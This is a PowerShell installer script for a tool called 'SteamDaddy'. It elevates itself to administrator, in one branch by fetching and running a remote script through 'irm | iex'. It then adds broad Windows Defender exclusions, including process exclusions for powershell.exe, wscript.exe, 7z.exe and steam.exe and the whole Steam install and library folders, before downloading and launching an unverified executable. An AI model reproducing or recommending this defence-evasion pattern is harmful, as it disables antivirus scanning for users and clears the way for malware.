# SteamDaddy One-Click Installer
$ErrorActionPreference = "Stop"

# Ensure Administrator privileges so Defender exclusion calls succeed
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "[SteamDaddy] Relaunching installer with Administrator privileges to apply path exclusions..." -ForegroundColor Yellow
    if ($PSCommandPath) {
        Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    } else {
        Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"irm https://raw.githubusercontent.com/Contrary7nit/SteamDaddy/main/install.ps1 | iex`"" -Verb RunAs
    }
    exit
}

Write-Host "[SteamDaddy] Fetching latest release..." -ForegroundColor Cyan

try {
    $downloadUrl = "https://github.com/Contrary7nit/SteamDaddy/releases/latest/download/SteamDaddy.exe"

    $desktop = [Environment]::GetFolderPath("Desktop")
    $destPath = Join-Path $desktop "SteamDaddy.exe"

    Write-Host "[SteamDaddy] Pre-registering Defender path & process exclusions..." -ForegroundColor Yellow
    Add-MpPreference -ExclusionPath $destPath -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess "SteamDaddy.exe" -ErrorAction SilentlyContinue

    # ── SteamDaddy Safe-Zone (fixed pre-excluded temp directory) ─────────
    $sdTempDir = "C:\ProgramData\SteamDaddy\tmp"
    if (-not (Test-Path $sdTempDir)) {
        New-Item -ItemType Directory -Path $sdTempDir -Force | Out-Null
    }
    Write-Host "[SteamDaddy] Excluding safe-zone temp folder: $sdTempDir" -ForegroundColor Yellow
    Add-MpPreference -ExclusionPath "C:\ProgramData\SteamDaddy" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath $sdTempDir -ErrorAction SilentlyContinue

    # ── Process exclusions (Defender won't scan files written by these) ──
    Add-MpPreference -ExclusionProcess "steam.exe"        -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess "7z.exe"           -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess "wscript.exe"      -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess "powershell.exe"   -ErrorAction SilentlyContinue

    # ── Find and exclude the Steam root directory ─────────────────────────
    $steamPath = (Get-ItemProperty -Path "HKLM:\SOFTWARE\WOW6432Node\Valve\Steam" -Name "InstallPath" -ErrorAction SilentlyContinue).InstallPath
    if (-not $steamPath) {
        $steamPath = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Valve\Steam" -Name "InstallPath" -ErrorAction SilentlyContinue).InstallPath
    }
    if (-not $steamPath) {
        $steamPath = (Get-ItemProperty -Path "HKCU:\SOFTWARE\Valve\Steam" -Name "InstallPath" -ErrorAction SilentlyContinue).InstallPath
    }
    if ($steamPath) {
        Write-Host "[SteamDaddy] Excluding Steam root folder: $steamPath" -ForegroundColor Yellow
        Add-MpPreference -ExclusionPath $steamPath -ErrorAction SilentlyContinue

        # Explicit belt-and-suspenders for the two hottest subdirs
        Add-MpPreference -ExclusionPath (Join-Path $steamPath "depotcache")       -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionPath (Join-Path $steamPath "config\stplug-in") -ErrorAction SilentlyContinue

        # ── Parse libraryfolders.vdf and exclude all secondary libraries ──
        $libraryVdf = Join-Path $steamPath "steamapps\libraryfolders.vdf"
        if (Test-Path $libraryVdf) {
            $vdfContent = Get-Content $libraryVdf -Raw -ErrorAction SilentlyContinue
            if ($vdfContent) {
                $libMatches = [regex]::Matches($vdfContent, '"path"\s+"([^"]+)"')
                foreach ($m in $libMatches) {
                    $libPath = $m.Groups[1].Value.Replace("\\\\", "\\")
                    if ($libPath -and $libPath -ne $steamPath -and (Test-Path $libPath)) {
                        Write-Host "[SteamDaddy] Excluding Steam library: $libPath" -ForegroundColor Yellow
                        Add-MpPreference -ExclusionPath $libPath -ErrorAction SilentlyContinue
                    }
                }
            }
        }
    }

    Write-Host "[SteamDaddy] Downloading SteamDaddy.exe to Desktop..." -ForegroundColor Magenta
    Invoke-WebRequest -Uri $downloadUrl -OutFile $destPath

    Write-Host "[SteamDaddy] Launching SteamDaddy..." -ForegroundColor Green
    Start-Process $destPath
} catch {
    Write-Host "[SteamDaddy] Installation failed: $_" -ForegroundColor Red
}
